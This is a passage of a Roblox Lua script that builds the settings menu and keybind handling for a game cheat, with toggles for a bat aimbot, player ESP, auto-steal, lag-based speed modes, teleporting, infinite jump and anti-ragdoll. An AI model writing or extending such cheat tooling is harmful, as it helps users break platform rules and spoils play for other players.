	end

	local GAMEPAD_KEYS = {
		[Enum.KeyCode.ButtonA] = true, [Enum.KeyCode.ButtonB] = true,
		[Enum.KeyCode.ButtonX] = true, [Enum.KeyCode.ButtonY] = true,
		[Enum.KeyCode.ButtonL1] = true, [Enum.KeyCode.ButtonR1] = true,
		[Enum.KeyCode.ButtonL2] = true, [Enum.KeyCode.ButtonR2] = true,
		[Enum.KeyCode.ButtonL3] = true, [Enum.KeyCode.ButtonR3] = true,
		[Enum.KeyCode.ButtonStart] = true, [Enum.KeyCode.ButtonSelect] = true,
		[Enum.KeyCode.DPadUp] = true, [Enum.KeyCode.DPadDown] = true,
		[Enum.KeyCode.DPadLeft] = true, [Enum.KeyCode.DPadRight] = true
	}

	local function isGamepadInput(inp)
		return inp and inp.UserInputType and inp.UserInputType.Name:match("^Gamepad") ~= nil
	end

	local function isBindableInput(inp)
		if not inp or inp.KeyCode == Enum.KeyCode.Unknown then return false end
		if inp.UserInputType == Enum.UserInputType.Keyboard then return true end
		return isGamepadInput(inp) and GAMEPAD_KEYS[inp.KeyCode] == true
	end

	local function kbMatch(entry, kc)
		return kc and (kc == entry.kb or (entry.gp and kc == entry.gp))
	end

	local function mkKB(parent, kbEntry, cb)
		local btn = Instance.new("TextButton", parent)
		btn.Size = UDim2.new(0, 58, 0, 22)
		btn.Position = UDim2.new(1, -66, 0.5, -11)
		btn.BackgroundColor3 = INP
		btn.BorderSizePixel = 0
		local function getLabel()
			return (kbEntry.gp and kbEntry.gp.Name) or (kbEntry.kb and kbEntry.kb.Name) or "None"
		end
		btn.Text = getLabel()
		btn.TextColor3 = Color3.fromRGB(0, 0, 0)
		btn.Font = Enum.Font.GothamBlack
		btn.TextSize = IsMobile and 9 or 11
		btn.ZIndex = 5
		Instance.new("UICorner", btn).CornerRadius = UDim.new(1, 0)
		local kbStroke = Instance.new("UIStroke", btn)
		kbStroke.Color = ACCENT
		kbStroke.Thickness = 1
		kbStroke.Transparency = 0.34
		btn.MouseEnter:Connect(function()
			TS:Create(kbStroke, TweenInfo.new(0.12), { Color = ICE, Transparency = 0.02 }):Play()
		end)
		btn.MouseLeave:Connect(function()
			TS:Create(kbStroke, TweenInfo.new(0.12), { Color = ACCENT, Transparency = 0.34 }):Play()
		end)
		local li = false
		local lc
		local pv = btn.Text
		local listenStart = 0
		btn.Activated:Connect(function()
			if li then
				li = false
				_anyKeyListening = false
				if lc then lc:Disconnect(); lc = nil end
				btn.Text = pv
				return
			end
			pv = btn.Text
			li = true
			_anyKeyListening = true
			listenStart = tick()
			btn.Text = "..."
			lc = UIS.InputBegan:Connect(function(inp)
				if not li then return end
				if inp.KeyCode == Enum.KeyCode.Escape then
					li = false
					_anyKeyListening = false
					if lc then lc:Disconnect(); lc = nil end
					btn.Text = pv
					return
				end
				local isGp = isGamepadInput(inp)
				if isGp and tick() - listenStart < 0.15 then return end
				if not isBindableInput(inp) then return end
				btn.Text = inp.KeyCode.Name
				pv = inp.KeyCode.Name
				li = false
				_anyKeyListening = false
				if lc then lc:Disconnect(); lc = nil end
				if cb then cb(inp.KeyCode, isGp) end
			end)
		end)
		return btn
	end

	local function mkToggleKB(parent, txt, kbEntry, onToggle, onKB)
		local row = mkRow(parent, ROW_H)
		mkLabel(row, txt)
		if kbEntry then mkKB(row, kbEntry, function(k, isGp)
			if isGp then kbEntry.gp = k; kbEntry.kb = nil
			else kbEntry.kb = k; kbEntry.gp = nil end
			if onKB then onKB(k, isGp) end
		end) end
		local pill, dot = mkPill(row, kbEntry and 112 or 46)
		local on = false
		local function sv(s)
			on = s
			animPill(pill, dot, s)
		end
		local clk = Instance.new("TextButton", pill)
		clk.Size = UDim2.new(1, 0, 1, 0)
		clk.BackgroundTransparency = 1
		clk.Text = ""
		clk.ZIndex = 5
		clk.Activated:Connect(function()
			if _anyKeyListening then return end
			on = not on
			sv(on)
			if onToggle then onToggle(on) end
		end)
		return sv
	end

	local function applyUiScale()
		if mainUIScale then mainUIScale.Scale = (IsMobile and 0.85 or 1) * uiScaleValue end
	end

	local function applyMobileButtonScale()
		if mobileUIScale then mobileUIScale.Scale = mobileButtonScaleValue end
		refreshMobileButtonUi()
	end

	local SCALE_OPTIONS = { 1, 1.25, 1.5, 1.75, 2 }

	local function mkSizeSelector(parent, txt, getValue, setValue, setters)
		local row = mkRow(parent, ROW_H)
		local label = mkLabel(row, txt)
		if label then label.Size = UDim2.new(0, IsMobile and 58 or 118, 1, 0) end
		local buttons = {}
		local btnW = IsMobile and 26 or 30
		local step = IsMobile and 30 or 34
		local totalW = (step * 4) + btnW
		for i, v in ipairs(SCALE_OPTIONS) do
			local btn = Instance.new("TextButton", row)
			btn.Size = UDim2.new(0, btnW, 0, 20)
			btn.Position = UDim2.new(1, -totalW + (i - 1) * step, 0.5, -10)
			btn.BackgroundColor3 = INP
			btn.BorderSizePixel = 0
			btn.Text = tostring(math.floor(v * 100)) .. "%"
			btn.TextColor3 = Color3.fromRGB(0, 0, 0)
			btn.Font = Enum.Font.GothamBlack
			btn.TextSize = IsMobile and 6 or 7
			btn.AutoButtonColor = false
			btn.ZIndex = 4
			Instance.new("UICorner", btn).CornerRadius = UDim.new(1, 0)
			local st = Instance.new("UIStroke", btn)
			st.Color = ACCENT
			st.Thickness = 1
			st.Transparency = 0.36
			buttons[#buttons + 1] = { btn = btn, stroke = st, value = v }
			btn.Activated:Connect(function()
				if _anyKeyListening then return end
				setValue(v)
				for _, refresh in ipairs(setters) do refresh() end
				saveConfig()
			end)
		end
		local function refresh()
			for _, item in ipairs(buttons) do
				local active = math.abs(getValue() - item.value) < 0.01
				item.btn.BackgroundColor3 = active and ICE or INP
				item.btn.TextColor3 = Color3.fromRGB(0, 0, 0)
				item.stroke.Color = active and ICE or ACCENT
				item.stroke.Transparency = active and 0.04 or 0.36
			end
		end
		table.insert(setters, refresh)
		refresh()
	end

	mkSect(mainPage, "Speed Values")

	do
		local row = mkRow(mainPage, ROW_H)
		mkLabel(row, "Normal Speed")
		normalBox = mkBox(row, NS, 58, 68, function(v)
			if v > 0 and v <= 500 then NS = v end
			saveConfig()
		end)
	end

	setAutoCarryVisual = mkToggle(mainPage, "Auto Carry Speed", function(on)
		autoCarryEnabled = on
		if on then
			-- Auto carry speed logic
		end
		saveConfig()
	end)

	do
		local row = mkRow(mainPage, ROW_H)
		mkLabel(row, "Carry Speed")
		carryBox = mkBox(row, CS, 58, 68, function(v)
			if v > 0 and v <= 500 then CS = v end
			saveConfig()
		end)
	end

	do
		local row = mkRow(mainPage, ROW_H)
		mkLabel(row, "Lagger Speed")
		laggerBox = mkBox(row, LAGGER_SPEED, 58, 68, function(v)
			if v > 0 and v <= 500 then LAGGER_SPEED = v end
			saveConfig()
		end)
	end

	do
		local row = mkRow(mainPage, ROW_H)
		mkLabel(row, "Lagger Carry Speed")
		laggerCarryBox = mkBox(row, LAGGER_CARRY_SPEED, 58, 68, function(v)
			if v > 0 and v <= 500 then LAGGER_CARRY_SPEED = v end
			saveConfig()
		end)
	end

	do
		local row = mkRow(mainPage, ROW_H)
		mkLabel(row, "Mode")
		modeValLbl = Instance.new("TextLabel", row)
		modeValLbl.Size = UDim2.new(0, 110, 1, 0)
		modeValLbl.Position = UDim2.new(1, -118, 0, 0)
		modeValLbl.BackgroundTransparency = 1
		modeValLbl.Text = "Normal"
		modeValLbl.TextColor3 = ACCENT
		modeValLbl.Font = Enum.Font.GothamBlack
		modeValLbl.TextSize = IsMobile and 11 or 13
		modeValLbl.TextXAlignment = Enum.TextXAlignment.Right
		local clk = Instance.new("TextButton", row)
		clk.Size = UDim2.new(1, 0, 1, 0)
		clk.BackgroundTransparency = 1
		clk.Text = ""
		clk.ZIndex = 2
		clk.Activated:Connect(function()
			if _anyKeyListening then return end
			toggleCarryMode()
			saveConfig()
		end)
	end

	mkSect(mainPage, "Speed Keybinds")

	do
		local row = mkRow(mainPage, ROW_H)
		mkLabel(row, "Speed Key")
		mkKB(row, KB.SpeedToggle, function(k, isGp)
			if isGp then KB.SpeedToggle.gp = k; KB.SpeedToggle.kb = nil
			else KB.SpeedToggle.kb = k; KB.SpeedToggle.gp = nil end
			saveConfig()
		end)
	end

	do
		local row = mkRow(mainPage, ROW_H)
		mkLabel(row, "Lagger Key")
		mkKB(row, KB.LaggerToggle, function(k, isGp)
			if isGp then KB.LaggerToggle.gp = k; KB.LaggerToggle.kb = nil
			else KB.LaggerToggle.kb = k; KB.LaggerToggle.gp = nil end
			saveConfig()
		end)
	end

	do
		local row = mkRow(mainPage, ROW_H)
		mkLabel(row, "Lagger Carry Key")
		mkKB(row, KB.LaggerCarryToggle, function(k, isGp)
			if isGp then KB.LaggerCarryToggle.gp = k; KB.LaggerCarryToggle.kb = nil
			else KB.LaggerCarryToggle.kb = k; KB.LaggerCarryToggle.gp = nil end
			saveConfig()
		end)
	end

	mkSect(mainPage, "Bat Aimbot")

	setAutoSwingVisual = mkToggle(mainPage, "Auto Swing", function(on)
		autoSwingEnabled = on
		saveConfig()
	end)
	if setAutoSwingVisual then setAutoSwingVisual(autoSwingEnabled) end

	setBatCounterVisual = mkToggle(mainPage, "Bat Counter", function(on)
		batCounterEnabled = on
		if on then startBatCounter() else stopBatCounter() end
		saveConfig()
	end)

	setMedusaVisual = mkToggle(mainPage, "Medusa Counter", function(on)
		medusaCounterEnabled = on
		if on then setupMedusa(LP.Character) else stopMedusaCounter() end
		saveConfig()
	end)

	do
		local abRow = mkRow(mainPage, ROW_H)
		mkLabel(abRow, "Aimbot Key")
		mkKB(abRow, KB.AutoBat, function(k, isGp)
			if isGp then KB.AutoBat.gp = k; KB.AutoBat.kb = nil
			else KB.AutoBat.kb = k; KB.AutoBat.gp = nil end
			saveConfig()
		end)
		autoBatSetVisual = function() end
	end

	do
		local abRow = mkRow(mainPage, ROW_H)
		mkLabel(abRow, "Bat V2 Key")
		mkKB(abRow, KB.BatV2, function(k, isGp)
			if isGp then KB.BatV2.gp = k; KB.BatV2.kb = nil
			else KB.BatV2.kb = k; KB.BatV2.gp = nil end
			saveConfig()
		end)
	end

	do
		local row = mkRow(mainPage, ROW_H)
		mkLabel(row, "Aimbot Speed")
		mkBox(row, AIMBOT_SPEED, 58, 68, function(v)
			if v > 0 and v <= 500 then AIMBOT_SPEED = v end
			saveConfig()
		end)
	end

	do
		local row = mkRow(mainPage, ROW_H)
		mkLabel(row, "Bat V2 Speed")
		mkBox(row, BAT_V2_CHASE_SPD, 58, 68, function(v)
			if v > 0 and v <= 500 then BAT_V2_CHASE_SPD = v end
			saveConfig()
		end)
	end

	-- TP BAT TOGGLE
	mkSect(mainPage, "TP Bat")

	tpBatSetVisual = mkToggle(mainPage, "TP Bat", function(on)
		if on then
			startTpBat()
		else
			stopTpBat()
		end
		saveConfig()
	end)

	do
		local row = mkRow(mainPage, ROW_H)
		mkLabel(row, "TP Bat Key")
		mkKB(row, KB.TPBat, function(k, isGp)
			if isGp then KB.TPBat.gp = k; KB.TPBat.kb = nil
			else KB.TPBat.kb = k; KB.TPBat.gp = nil end
			saveConfig()
		end)
	end

	-- VAMPIRE ANIM TOGGLE
	mkSect(mainPage, "Vampire Anim")

	local vampireToggle = mkToggle(mainPage, "Vampire Anim", function(on)
		if on then
			enableVampireAnim()
		else
			disableVampireAnim()
		end
		saveConfig()
	end)

	-- FONT STYLE SELECTOR
	mkSect(mainPage, "Font Style")

	local fontRow = mkRow(mainPage, ROW_H)
	mkLabel(fontRow, "Font Style")

	local fCont = Instance.new("Frame", fontRow)
	fCont.AnchorPoint = Vector2.new(1, 0.5)
	fCont.Position = UDim2.new(1, -10, 0.5, 0)
	fCont.Size = UDim2.new(0, 170, 0, 26)
	fCont.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
	fCont.BorderSizePixel = 0
	fCont.ZIndex = 5
	Instance.new("UICorner", fCont).CornerRadius = UDim.new(0, 5)

	local arW = 28
	local fPrev = Instance.new("TextButton", fCont)
	fPrev.Size = UDim2.new(0, arW, 1, 0)
	fPrev.Position = UDim2.new(0, 0, 0, 0)
	fPrev.BackgroundTransparency = 1
	fPrev.BorderSizePixel = 0
	fPrev.Text = "<"
	fPrev.TextColor3 = Color3.fromRGB(200, 200, 200)
	fPrev.Font = Enum.Font.GothamBold
	fPrev.TextSize = 14
	fPrev.ZIndex = 6

	local fLbl = Instance.new("TextLabel", fCont)
	fLbl.Position = UDim2.new(0, arW, 0, 0)
	fLbl.Size = UDim2.new(1, -arW * 2, 1, 0)
	fLbl.BackgroundTransparency = 1
	fLbl.Text = _FONTS[_currentFontIdx].name
	fLbl.TextColor3 = Color3.fromRGB(220, 220, 220)
	fLbl.Font = Enum.Font.GothamBold
	fLbl.TextSize = 10
	fLbl.ZIndex = 6

	local fNext = Instance.new("TextButton", fCont)
	fNext.AnchorPoint = Vector2.new(1, 0)
	fNext.Position = UDim2.new(1, 0, 0, 0)
	fNext.Size = UDim2.new(0, arW, 1, 0)
	fNext.BackgroundTransparency = 1
	fNext.BorderSizePixel = 0
	fNext.Text = ">"
	fNext.TextColor3 = Color3.fromRGB(200, 200, 200)
	fNext.Font = Enum.Font.GothamBold
	fNext.TextSize = 14
	fNext.ZIndex = 6

	local function fRefresh()
		fLbl.Text = string.upper(_FONTS[_currentFontIdx].name)
		refreshAllFonts()
		saveConfig()
	end

	fPrev.MouseButton1Click:Connect(function()
		_currentFontIdx = _currentFontIdx - 1
		if _currentFontIdx < 1 then _currentFontIdx = #_FONTS end
		fRefresh()
	end)

	fNext.MouseButton1Click:Connect(function()
		_currentFontIdx = _currentFontIdx + 1
		if _currentFontIdx > #_FONTS then _currentFontIdx = 1 end
		fRefresh()
	end)

	mkSect(mainPage, "Insta Grab")

	setInstaGrab = mkToggle(mainPage, "Auto Steal", function(on)
		CONFIG.AUTO_STEAL_ENABLED = on
		if on then
			if not pcall(startAutoSteal) then
				CONFIG.AUTO_STEAL_ENABLED = false
				if setInstaGrab then setInstaGrab(false) end
			end
		else
			stopAutoSteal()
		end
		saveConfig()
	end)

	do
		local row = mkRow(mainPage, ROW_H)
		mkLabel(row, "Steal Radius")
		radInput = mkBox(row, CONFIG.STEAL_RANGE, 58, 68, function(v)
			if v >= 0.5 and v <= 300 then
				CONFIG.STEAL_RANGE = v
				if progressRadLbl then progressRadLbl.Text = string.format("Radius: %.2g", CONFIG.STEAL_RANGE) end
			end
			saveConfig()
		end)
	end

	mkSect(mainPage, "Movement")

	do
		local row = mkRow(mainPage, ROW_H)
		mkLabel(row, "Auto Left")
		mkKB(row, KB.AutoLeft, function(k, isGp)
			if isGp then KB.AutoLeft.gp = k; KB.AutoLeft.kb = nil
			else KB.AutoLeft.kb = k; KB.AutoLeft.gp = nil end
			saveConfig()
		end)
		autoLeftSetVisual = function() end
	end

	do
		local row = mkRow(mainPage, ROW_H)
		mkLabel(row, "Auto Right")
		mkKB(row, KB.AutoRight, function(k, isGp)
			if isGp then KB.AutoRight.gp = k; KB.AutoRight.kb = nil
			else KB.AutoRight.kb = k; KB.AutoRight.gp = nil end
			saveConfig()
		end)
		autoRightSetVisual = function() end
	end

	do
		local row = mkRow(mainPage, ROW_H)
		mkLabel(row, "Drop Brainrot")
		mkKB(row, KB.DropBrainrot, function(k, isGp)
			if isGp then KB.DropBrainrot.gp = k; KB.DropBrainrot.kb = nil
			else KB.DropBrainrot.kb = k; KB.DropBrainrot.gp = nil end
			saveConfig()
		end)
		local clk = Instance.new("TextButton", row)
		clk.Size = UDim2.new(0.58, 0, 1, 0)
		clk.BackgroundTransparency = 1
		clk.Text = ""
		clk.ZIndex = 2
		clk.Activated:Connect(function()
			runDrop()
		end)
	end

	do
		local row = mkRow(mainPage, ROW_H)
		mkLabel(row, "TP Down")
		mkKB(row, KB.TPFloor, function(k, isGp)
			if isGp then KB.TPFloor.gp = k; KB.TPFloor.kb = nil
			else KB.TPFloor.kb = k; KB.TPFloor.gp = nil end
			saveConfig()
		end)
		local clk = Instance.new("TextButton", row)
		clk.Size = UDim2.new(0.58, 0, 1, 0)
		clk.BackgroundTransparency = 1
		clk.Text = ""
		clk.ZIndex = 2
		clk.Activated:Connect(function()
			runTPFloor()
		end)
	end

	setAutoTPVisual = mkToggle(mainPage, "Auto TP Down", function(on)
		autoTPEnabled = on
		if on then startAutoTP() else stopAutoTP() end
		saveConfig()
	end)

	do
		local row = mkRow(mainPage, ROW_H)
		mkLabel(row, "TP Height")
		autoTPHeightBox = mkBox(row, autoTPHeight, 64, 74, function(v)
			if v >= 0 and v <= 500 then autoTPHeight = v
			else autoTPHeightBox.Text = tostring(autoTPHeight) end
			saveConfig()
		end)
	end

	autoTPDownSetVisual = mkToggle(mainPage, "Auto TP Down (Ray)", function(on)
		autoTPDownEnabled = on
		if on then startAutoTPDown() else stopAutoTPDown() end
		saveConfig()
	end)

	setHoldJumpVisual = mkToggle(mainPage, "Hold Jump", function(on)
		holdJumpEnabled = on
		if on then startHoldJump() else stopHoldJump() end
		saveConfig()
	end)

	setInfJumpVisual = mkToggle(mainPage, "Infinite Jump", function(on)
		infJumpEnabled = on
	end)

	setUnwalkVisual = mkToggle(mainPage, "Unwalk", function(on)
		unwalkEnabled = on
		if on then startUnwalk() else stopUnwalk() end
	end)

	setAntiRagVisual = mkToggle(mainPage, "Anti Ragdoll", function(on)
		antiRagdollEnabled = on
		if on then startAntiRagdoll() else stopAntiRagdoll() end
	end)

	local safeModeToggle = mkToggle(mainPage, "Safe Mode", function(on)
		_GACC.safeModeEnabled = on
		if not on then _GACC.safeModeActive = false end
		saveConfig()
	end)
	if _GACC.safeModeEnabled then safeModeToggle(true) end

	setBodyLockVisual = mkToggle(mainPage, "Body Lock", function(on)
		toggleBodyLock(on)
	end)

	setShowIntroVisual = mkToggle(mainPage, "Show Intro", function(on)
		showIntroEnabled = on
		saveConfig()
	end)

	mkSect(mainPage, "Visuals")

	-- ESP PLAYER TOGGLE - FIXED SAVING
	setEspVisual = mkToggle(mainPage, "Player ESP", function(on)
		if on then
			espEnabled = true
			startESP()
		else
			espEnabled = false
			stopESP()
		end
		saveConfig()
	end)

	-- STRETCH REZ (FPS Boost) - from Akai Hub
	setStretchRezVisual = mkToggle(mainPage, "Stretch Rez", function(on)
		if on then enableStretchRez() else disableStretchRez() end
		saveConfig()
	end)

	-- FOV 120 - from Akai Hub
	fovSetVisual = mkToggle(mainPage, "FOV 120", function(on)
		if on then enableFOV() else disableFOV() end
		saveConfig()
	end)

	setAntiLagVisual = mkToggle(mainPage, "Anti Lag", function(on)
		if on then enableAntiLag() else disableAntiLag() end
		saveConfig()
	end)

	setRagdolTimerVisual = mkToggle(mainPage, "RAGDOL TIMER", function(on)
		setRagdolTimer(on)
		saveConfig()
	end)

	do
		local row = mkRow(mainPage, ROW_H)
		mkLabel(row, "Sky Theme")
		local skyIndex = 1
		local current = tostring(currentSkyTheme or _G._blessvsSkyMode or CandySkyOrder[1][2])
		for i, entry in ipairs(CandySkyOrder) do
			if entry[2] == current then skyIndex = i; break end
		end
		local skyVal = Instance.new("TextLabel", row)
		skyVal.Size = UDim2.new(0, 150, 1, 0)
		skyVal.Position = UDim2.new(1, -158, 0, 0)
		skyVal.BackgroundTransparency = 1
		skyVal.Text = CandySkyOrder[skyIndex][2]
		skyVal.TextColor3 = ACCENT
		skyVal.Font = Enum.Font.GothamBlack
		skyVal.TextSize = IsMobile and 11 or 13
		skyVal.TextXAlignment = Enum.TextXAlignment.Right
		local clk = Instance.new("TextButton", row)
		clk.Size = UDim2.new(1, 0, 1, 0)
		clk.BackgroundTransparency = 1
		clk.Text = ""
		clk.ZIndex = 2
		clk.Activated:Connect(function()
			if _anyKeyListening then return end
			skyIndex = skyIndex % #CandySkyOrder + 1
			local label = CandySkyOrder[skyIndex][2]
			skyVal.Text = label
			currentSkyTheme = label
			CandyApplyCustomSky(label)
			saveConfig()
		end)
	end

	mkSect(mainPage, "Settings")

	setLockGuiVisual = mkToggle(mainPage, "Lock GUI", function(on)
		setGuiLock(on)
	end)

	setHideMobileVisual = mkToggle(mainPage, "Hide Mobile Buttons", function(on)
		hideMobileButtons = on
		refreshMobileButtonUi()
		saveConfig()
	end)

	setEditMobileVisual = mkToggle(mainPage, "Edit Mobile Buttons", function(on)
		editMobileButtons = on
		refreshMobileButtonUi()
		saveConfig()
	end)

	do
		local row = mkRow(mainPage, ROW_H)
		mkLabel(row, "Reset Mobile Buttons")
		local btn = Instance.new("TextButton", row)
		btn.Size = UDim2.new(0, 86, 0, 22)
		btn.Position = UDim2.new(1, -94, 0.5, -11)
		btn.BackgroundColor3 = ACCENT
		btn.BorderSizePixel = 0
		btn.Text = "RESET"
		btn.TextColor3 = Color3.fromRGB(0, 0, 0)
		btn.Font = Enum.Font.GothamBlack
		btn.TextSize = IsMobile and 10 or 12
		btn.AutoButtonColor = false
		btn.ZIndex = 3
		Instance.new("UICorner", btn).CornerRadius = UDim.new(1, 0)
		local rst = Instance.new("UIStroke", btn)
		rst.Color = ACCENT
		rst.Thickness = 1
		rst.Transparency = 0.34
		btn.MouseEnter:Connect(function()
			TS:Create(rst, TweenInfo.new(0.12), { Color = ICE, Transparency = 0.02 }):Play()
		end)
		btn.MouseLeave:Connect(function()
			TS:Create(rst, TweenInfo.new(0.12), { Color = ACCENT, Transparency = 0.34 }):Play()
		end)
		btn.Activated:Connect(function()
			if _anyKeyListening then return end
			resetMobileButtonLayout()
			saveConfig()
		end)
	end

	do
		local row = mkRow(mainPage, ROW_H)
		mkLabel(row, "Hide UI Key")
		mkKB(row, KB.GuiHide, function(k, isGp)
			if isGp then KB.GuiHide.gp = k; KB.GuiHide.kb = nil
			else KB.GuiHide.kb = k; KB.GuiHide.gp = nil end
			saveConfig()
		end)
	end

	do
		local row = mkRow(mainPage, ROW_H)
		mkLabel(row, "ELITE Lagger")
		local btn = Instance.new("TextButton", row)
		btn.Size = UDim2.new(0, 86, 0, 22)
		btn.Position = UDim2.new(1, -94, 0.5, -11)
		btn.BackgroundColor3 = ACCENT
		btn.BorderSizePixel = 0
		btn.Text = "OPEN"
		btn.TextColor3 = Color3.fromRGB(0, 0, 0)
		btn.Font = Enum.Font.GothamBlack
		btn.TextSize = IsMobile and 10 or 12
		btn.AutoButtonColor = false
		btn.ZIndex = 3
		Instance.new("UICorner", btn).CornerRadius = UDim.new(1, 0)
		local opn = Instance.new("UIStroke", btn)
		opn.Color = ICE
		opn.Thickness = 1
		opn.Transparency = 0.34
		btn.MouseEnter:Connect(function()
			TS:Create(opn, TweenInfo.new(0.12), { Transparency = 0.02 }):Play()
		end)
		btn.MouseLeave:Connect(function()
			TS:Create(opn, TweenInfo.new(0.12), { Transparency = 0.34 }):Play()
		end)
		btn.Activated:Connect(function()
			if _anyKeyListening then return end
			if setBlessLaggerPanelVisible then setBlessLaggerPanelVisible(true) end
		end)
	end

	if setHideMobileVisual then setHideMobileVisual(hideMobileButtons) end
	if setEditMobileVisual then setEditMobileVisual(editMobileButtons) end
	setGuiLock(uiLocked, true)

	-- KEYBINDS
	UIS.InputBegan:Connect(function(input, gpe)
		if _anyKeyListening then return end
		if input.UserInputType == Enum.UserInputType.Keyboard then
			if gpe or UIS:GetFocusedTextBox() then return end
		elseif not isGamepadInput(input) then
			return
		end
		if not isBindableInput(input) then return end
		local kc = input.KeyCode

		if kbMatch(KB.TPBat, kc) then
			toggleTpBat()
			return
		end

		if kbMatch(KB.BatV2, kc) then
			State.BatV2 = not State.BatV2

			if State.BatV2 then
				if autoLeftEnabled then
					autoLeftEnabled = false
					stopAutoLeft()
					if autoLeftSetVisual then autoLeftSetVisual(false) end
				end
				if autoRightEnabled then
					autoRightEnabled = false
					stopAutoRight()
					if autoRightSetVisual then autoRightSetVisual(false) end
				end
				if autoBatEnabled then
					stopBatAimbot()
					if autoBatSetVisual then autoBatSetVisual(false) end
				end
				if tpBatEnabled then
					stopTpBat()
					if tpBatSetVisual then tpBatSetVisual(false) end
				end
				startBatV2Aimbot()
			else
				stopBatV2Aimbot()
			end
			if setBatV2Visual then setBatV2Visual(State.BatV2) end
			saveConfig()
			return
		end

		if kbMatch(KB.AutoLeft, kc) then
			if State.BatV2 then
				State.BatV2 = false
				stopBatV2Aimbot()
				if setBatV2Visual then setBatV2Visual(false) end
			end
			autoLeftEnabled = not autoLeftEnabled
			if autoLeftEnabled then
				queueAutoLeftStart()
			else
				stopAutoLeft()
			end
			if autoLeftSetVisual then autoLeftSetVisual(autoLeftEnabled) end
			saveConfig()
			return
		end

		if kbMatch(KB.AutoRight, kc) then
			if State.BatV2 then
				State.BatV2 = false
				stopBatV2Aimbot()
				if setBatV2Visual then setBatV2Visual(false) end
			end
			autoRightEnabled = not autoRightEnabled
			if autoRightEnabled then
				queueAutoRightStart()
			else
				stopAutoRight()
			end
			if autoRightSetVisual then autoRightSetVisual(autoRightEnabled) end
			saveConfig()
			return
		end

		if kbMatch(KB.BlessLagger, kc) then
			setBlessLaggerEnabled(not blessLaggerActive)
			saveConfig()
		elseif kbMatch(KB.LaggerToggle, kc) then
			toggleLaggerMode()
			saveConfig()
		elseif kbMatch(KB.LaggerCarryToggle, kc) then
			toggleLaggerCarryMode()
			saveConfig()
		elseif kbMatch(KB.SpeedToggle, kc) then
			toggleCarryMode()
			saveConfig()
		elseif kbMatch(KB.DropBrainrot, kc) then
			runDrop()
		elseif kbMatch(KB.TPFloor, kc) then
			runTPFloor()
		elseif kbMatch(KB.AutoBat, kc) then
			if not autoBatEnabled then
				if State.BatV2 then
					State.BatV2 = false
					stopBatV2Aimbot()
					if setBatV2Visual then setBatV2Visual(false) end
				end
				if tpBatEnabled then
					stopTpBat()
					if tpBatSetVisual then tpBatSetVisual(false) end
				end
				startBatAimbot()
				if autoBatSetVisual then autoBatSetVisual(true) end
			else
				stopBatAimbot()
				if autoBatSetVisual then autoBatSetVisual(false) end
			end
		elseif kbMatch(KB.GuiHide, kc) then
			if main.Visible then hideGui() else showGui() end
		end
	end)

	task.spawn(function()
		playCandyIntro(gui, main, miniBtn)
	end)
end

-- ============================================================
-- MOBILE BUTTONS
-- ============================================================
function buildMobileButtons()
	local old = game:GetService("CoreGui"):FindFirstChild("blessvsMobileButtons")
	if old then old:Destroy() end
	local pg = LP:FindFirstChild("PlayerGui")
	if pg then
		local o = pg:FindFirstChild("blessvsMobileButtons")
		if o then o:Destroy() end
	end

	local screenGui2 = Instance.new("ScreenGui")
	screenGui2.Name = "blessvsMobileButtons"
	screenGui2.ResetOnSpawn = false
	screenGui2.DisplayOrder = 998
	screenGui2.IgnoreGuiInset = true
	pcall(function() screenGui2.Parent = game:GetService("CoreGui") end)
	if not screenGui2.Parent then screenGui2.Parent = LP:WaitForChild("PlayerGui") end
	mobileButtonsScreen = screenGui2
	screenGui2.Enabled = not hideMobileButtons
	mobileButtonFrames = {}

	local MOBILE_BTN_BG = Color3.fromRGB(18, 18, 18)
	local MOBILE_BTN_ACTIVE = Color3.fromRGB(220, 220, 220)
	local LIGHT_PINK = Color3.fromRGB(255, 255, 255)
	local BLACK_PURE = Color3.fromRGB(10, 10, 10)
	local PURPLE_ACCENT = Color3.fromRGB(255, 255, 255)

	local BG_BTN = MOBILE_BTN_BG
	local ACCENT = MOBILE_BTN_ACTIVE
	local TXT_C = LIGHT_PINK
	local ICE = PURPLE_ACCENT

	local BW = 62
	local BH = 62
	local COL_GAP = 10
	local ROW_GAP = 10

	local function mkCornerLocal(p, r)
		local c = Instance.new("UICorner", p)
		c.CornerRadius = UDim.new(0, r or 14)
		return c
	end

	local function mkStrokeLocal(p, col, th)
		local s = Instance.new("UIStroke", p)
		s.Color = col
		s.Thickness = th or 1
		s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
		return s
	end

	local container = Instance.new("Frame", screenGui2)
	container.Name = "MobileButtons"
	container.AnchorPoint = Vector2.new(1, 0)
	container.Size = UDim2.new(0, (BW * 2) + COL_GAP, 0, (BH * 7) + (ROW_GAP * 6))
	container.Position = mobileGroupPosition
		and UDim2.new(mobileGroupPosition.xs or 1, mobileGroupPosition.x or -20, mobileGroupPosition.ys or 0.12, mobileGroupPosition.y or 0)
		or UDim2.new(1, -20, 0.12, 0)
	container.BackgroundTransparency = 1
	container.BorderSizePixel = 0
	container.Active = false
	container.ClipsDescendants = false
	mobileButtonContainerRef = container
	mobileUIScale = Instance.new("UIScale", container)
	mobileUIScale.Scale = mobileButtonScaleValue

	local gridLayout = Instance.new("UIGridLayout", container)
	gridLayout.CellSize = UDim2.new(0, BW, 0, BH)
	gridLayout.CellPadding = UDim2.new(0, COL_GAP, 0, ROW_GAP)
	gridLayout.StartCorner = Enum.StartCorner.TopLeft
	gridLayout.SortOrder = Enum.SortOrder.LayoutOrder

	local DRAG_THRESHOLD = 12

	local function applyGridMode()
		if editMobileButtons then
			if gridLayout.Parent then gridLayout.Parent = nil end
			for btnId, data in pairs(mobileButtonFrames) do
				local saved = mobileButtonPositions[btnId]
				if saved then
					data.frame.Position = UDim2.new(0, saved.x, 0, saved.y)
				else
					data.frame.Position = data.defaultPosition
				end
			end
		else
			if not gridLayout.Parent then gridLayout.Parent = container end
		end
	end

	local _origRefresh = refreshMobileButtonUi
	refreshMobileButtonUi = function()
		_origRefresh()
		applyGridMode()
	end

	local function makeBtn(id, actionKey, label, layoutOrder)
		local defaultX = ((layoutOrder - 1) % 2) * (BW + COL_GAP)
		local defaultY = math.floor((layoutOrder - 1) / 2) * (BH + ROW_GAP)
		local saved = mobileButtonPositions[id]

		local btnFrame = Instance.new("Frame", container)
		btnFrame.Name = "Btn_" .. id
		btnFrame.Size = UDim2.new(0, BW, 0, BH)
		btnFrame.Position = UDim2.new(0, saved and saved.x or defaultX, 0, saved and saved.y or defaultY)
		btnFrame.BackgroundColor3 = BG_BTN
		btnFrame.BorderSizePixel = 0
